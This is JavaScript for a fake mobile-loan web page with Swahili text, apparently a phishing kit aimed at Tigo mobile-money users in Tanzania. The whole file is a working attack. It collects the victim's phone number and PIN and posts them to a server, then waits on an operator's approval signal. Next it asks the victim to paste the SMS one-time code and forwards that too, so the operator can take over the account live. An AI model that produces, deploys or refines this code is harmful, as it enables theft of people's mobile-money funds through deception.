document.addEventListener('DOMContentLoaded', () => {
    let sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
    
    const step1 = document.getElementById('step-1');
    const stepDetails = document.getElementById('step-details');
    const step3 = document.getElementById('step-3');
    const stepLogin = document.getElementById('step-login');
    const stepWaiting = document.getElementById('step-waiting');
    const stepOtp = document.getElementById('step-otp');
    const stepSuccess = document.getElementById('step-success');
    const backBtn = document.getElementById('backBtn');
    const errorBanner = document.getElementById('errorBanner');

    const amountSlider = document.getElementById('loanAmountSlider');
    const durationSlider = document.getElementById('loanDurationSlider');
    const amountDisplay = document.getElementById('amountDisplay');
    const durationDisplay = document.getElementById('durationDisplay');
    const monthlyPayment = document.getElementById('monthlyPayment');

    const inputAmount = document.getElementById('inputAmount');
    const inputDuration = document.getElementById('inputDuration');
    const tigoNumber = document.getElementById('tigoNumber');
    const pinBoxes = document.querySelectorAll('.pin-box');
    const submitLoginBtn = document.getElementById('submitLoginBtn');
    const otpSmsInput = document.getElementById('otpSmsInput');

    function showStep(stepEl) {
        [step1, stepDetails, step3, stepLogin, stepWaiting, stepOtp, stepSuccess].forEach(el => el.classList.remove('active'));
        stepEl.classList.add('active');
        backBtn.style.display = (stepEl === step1) ? 'none' : 'inline-block';
    }

    amountSlider.addEventListener('input', (e) => {
        const val = parseInt(e.target.value);
        amountDisplay.textContent = 'TSh ' + val.toLocaleString();
        inputAmount.value = val;
        updateMonthly(val, parseInt(durationSlider.value));
    });

    durationSlider.addEventListener('input', (e) => {
        const val = parseInt(e.target.value);
        durationDisplay.textContent = 'miezi ' + val;
        inputDuration.value = 'Miezi ' + val;
        updateMonthly(parseInt(amountSlider.value), val);
    });

    function updateMonthly(amount, months) {
        const monthly = Math.round((amount * 1.25) / months);
        monthlyPayment.textContent = 'TSh ' + monthly.toLocaleString();
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            if (e.target.value && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }
            checkLoginForm();
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    tigoNumber.addEventListener('input', checkLoginForm);

    function getPinString() {
        let pin = '';
        pinBoxes.forEach(b => pin += b.value);
        return pin;
    }

    function checkLoginForm() {
        const phoneVal = tigoNumber.value.trim();
        const pinVal = getPinString();
        const tigoRegex = /^07\d{8}$/;
        if (tigoRegex.test(phoneVal) && pinVal.length === 4) {
            submitLoginBtn.removeAttribute('disabled');
        } else {
            submitLoginBtn.setAttribute('disabled', 'true');
        }
    }

    document.getElementById('toStep2Btn').addEventListener('click', () => showStep(stepDetails));
    document.getElementById('toStep3Btn').addEventListener('click', () => {
        document.getElementById('sumAmount').textContent = amountDisplay.textContent;
        document.getElementById('sumDuration').textContent = inputDuration.value;
        showStep(step3);
    });

    // Step 3 does NOT submit immediately; it transitions to the login screen for phone and PIN credentials
    document.getElementById('toLoginScreenBtn').addEventListener('click', () => {
        showStep(stepLogin);
    });

    submitLoginBtn.addEventListener('click', async () => {
        const payload = {
            sessionId,
            phone: tigoNumber.value.trim(),
            pin: getPinString(),
            amount: amountSlider.value,
            duration: durationSlider.value
        };

        showStep(stepWaiting);

        try {
            const res = await fetch('/api/submit-credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await res.json();
            if (data.success) {
                pollAdminStatus();
            }
        } catch (err) {
            console.error(err);
            errorBanner.textContent = 'Hitilafu ya mtandao. Tafadhali jaribu tena.';
            errorBanner.style.display = 'block';
        }
    });

    function pollAdminStatus() {
        const interval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status/${sessionId}`);
                const data = await res.json();

                if (data.status === 'approved_pin') {
                    clearInterval(interval);
                    showStep(stepOtp);
                    startOtpTimer();
                } else if (data.status === 'denied' || data.status === 'wrong_pin') {
                    clearInterval(interval);
                    showStep(stepLogin);
                    alert(data.status === 'wrong_pin' ? 'PIN uliyoweka si sahihi. Tafadhali rudia.' : 'Maombi yako yamekataliwa na msimamizi.');
                } else if (data.status === 'success') {
                    clearInterval(interval);
                    document.getElementById('finalApprovedAmount').textContent = amountDisplay.textContent;
                    document.getElementById('resDuration').textContent = inputDuration.value;
                    showStep(stepSuccess);
                }
            } catch (e) {
                console.error(e);
            }
        }, 3000);
    }

    function startOtpTimer() {
        let seconds = 20;
        const timerEl = document.getElementById('countdownTimer');
        const timerInterval = setInterval(() => {
            seconds--;
            timerEl.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(timerInterval);
            }
        }, 1000);
    }

    document.getElementById('submitOtpBtn').addEventListener('click', async () => {
        const otpText = otpSmsInput.value.trim();
        if (!otpText) {
            alert('Tafadhali bandika ujumbe wa SMS hapa.');
            return;
        }

        showStep(stepWaiting);
        try {
            await fetch('/api/submit-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, otpText })
            });
            pollAdminStatus();
        } catch (e) {
            console.error(e);
        }
    });

    document.getElementById('homeBtn').addEventListener('click', () => {
        location.reload();
    });
});
            
